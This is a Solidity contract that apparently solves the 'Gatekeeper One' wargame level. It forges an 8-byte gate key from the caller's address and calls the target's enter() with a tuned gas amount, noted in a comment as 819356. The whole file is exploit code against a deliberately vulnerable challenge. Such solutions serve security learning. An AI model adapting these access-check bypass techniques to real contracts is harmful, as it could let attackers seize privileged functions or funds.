// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8) external;
}

contract EnterGateOne {
    // gasToSend = 819356 
    function unlock(address gateContractAddress, uint256 gasToSend) public {
        GatekeeperOne gate = GatekeeperOne(gateContractAddress);
        bytes8 gateKey = bytes8(bytes.concat(bytes1(0x01), bytes5(0x0), bytes2(uint16(uint160(msg.sender)))));
        gate.enter{gas: gasToSend}(gateKey);
    }
}
